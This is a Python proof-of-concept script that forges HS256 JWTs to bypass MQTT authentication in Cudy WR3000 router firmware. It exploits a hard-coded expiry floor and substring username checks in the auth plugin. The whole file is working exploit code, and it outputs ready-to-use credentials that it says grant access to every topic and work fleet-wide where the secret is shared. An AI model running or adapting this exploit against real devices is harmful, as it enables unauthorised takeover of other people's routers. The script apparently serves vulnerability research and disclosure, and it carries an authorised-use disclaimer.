#!/usr/bin/env python3
"""
forge_jwt.py — mint a token that Cudy's auth_plugin_jwt.so accepts.

The plugin (mosquitto_auth_unpwd_check @ 0x3318 in firmware 2.4.15) checks:
  1. MQTT username contains the target's 12-digit deviceid   (strstr)
  2. password verifies as HS256/384/512 JWT signed with bdinfo "secret"
  3. "exp" grant >= 1577826000  (a fixed floor; never compared to now)
  4. "username" grant contains the deviceid                  (strstr)
It then returns SUCCESS and acl_check() allows every topic.

Usage:
    python3 forge_jwt.py --deviceid 012345678901 --secret '<secret from bdinfo>'
    python3 forge_jwt.py --demo        # placeholder values, shows the shape

Requires: pyjwt  (pip install pyjwt)
Authorised research only — this exists to demonstrate the flaw, not to
attack devices you do not own.
"""
import argparse
import base64
import json
import time

EXP_FLOOR = 1577826000          # 2019-12-31T21:00:00Z, hard-coded in the plugin
DEFAULT_EXP = 1999999999        # 2033 — anything above the floor works, forever


def b64url(seg: bytes) -> str:
    return base64.urlsafe_b64encode(seg).rstrip(b"=").decode()


def forge(deviceid: str, secret: str, exp: int = DEFAULT_EXP) -> str:
    import jwt
    payload = {
        "exp": exp,
        "username": f"admincudydevice-{deviceid}",   # grant must contain deviceid
    }
    return jwt.encode(payload, secret, algorithm="HS256")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--deviceid", default="012345678901",
                    help="target's 12-digit mesh deviceid")
    ap.add_argument("--secret", help="bdinfo 'secret' value (the HMAC key)")
    ap.add_argument("--exp", type=int, default=DEFAULT_EXP)
    ap.add_argument("--demo", action="store_true",
                    help="use a placeholder secret and verify round-trip")
    args = ap.parse_args()

    secret = args.secret or "PLACEHOLDER-SECRET-FOR-DEMO"
    if not args.secret and not args.demo:
        print("[!] no --secret given; using placeholder (demo mode)")
    token = forge(args.deviceid, secret, args.exp)
    print(f"[+] token:\n{token}\n")

    hdr_b64, pl_b64, sig_b64 = token.split(".")
    print("header  :", json.loads(base64.urlsafe_b64decode(hdr_b64 + "==")))
    print("payload :", json.loads(base64.urlsafe_b64decode(pl_b64 + "==")))

    import jwt
    verified = jwt.decode(token, secret, algorithms=["HS256"])
    ok_exp = verified["exp"] >= EXP_FLOOR
    ok_user = args.deviceid in verified["username"]
    print(f"[+] self-verify HS256: OK")
    print(f"[+] exp {verified['exp']} >= floor {EXP_FLOOR}: {'OK' if ok_exp else 'FAIL'}")
    print(f"[+] username grant contains deviceid: {'OK' if ok_user else 'FAIL'}")
    if ok_exp and ok_user:
        print("\n[*] MQTT usage:  username = 'admincudydevice-%s'  password = <token>"
              % args.deviceid)
        print("[*] the same token authenticates against any WR3000 2.0 node on")
        print("    firmware < 2.5.24 that shares the secret (fleet-wide key).")


if __name__ == "__main__":
    main()
